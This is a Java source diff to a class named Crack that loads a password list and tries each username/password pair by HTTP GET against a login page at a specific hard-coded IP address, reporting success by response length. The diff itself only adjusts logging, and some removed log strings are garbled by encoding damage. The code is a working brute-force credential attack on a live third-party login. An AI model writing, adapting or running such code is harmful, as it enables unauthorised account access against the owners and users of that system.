@@ -21,14 +21,13 @@ public class Crack {
 	
 	public static final Integer MAX_CONTENT_LENGTH=400;
 	
-	Logger log = Logger.getLogger(Crack.class);
+	Logger log = Logger.getLogger("crack");
 	
 	public List<String> getPasswords(String path) throws IOException{
 		List<String> passwords= new ArrayList<String>();
 		BufferedReader  reader = new BufferedReader(new FileReader(path));
         String password=null;
         while ((password = reader.readLine()) != null) {
-        	log.info(password);
         	passwords.add(password);
         }
         reader.close();
@@ -42,7 +41,6 @@ public class Crack {
 			  }
 	}
 	public void send(String id,String password) throws ClientProtocolException, IOException{
-		log.info("≥¢ ‘’À∫≈√‹¬Î"+id+","+password);
 		CloseableHttpClient httpclient = HttpClients.createDefault();  
     	HttpGet httpget = new HttpGet("http://58.220.193.178:8880/yw/login.asp?username="+id+"&password="+password);  
         CloseableHttpResponse response = httpclient.execute(httpget);  
@@ -51,7 +49,7 @@ public class Crack {
         if(length<MAX_CONTENT_LENGTH){
         	successNotify(id,password);
         }
-        log.info("length≥§∂»"+length);
+        log.info("try --"+id+","+password+",and result-"+length);
         
 	}
 	
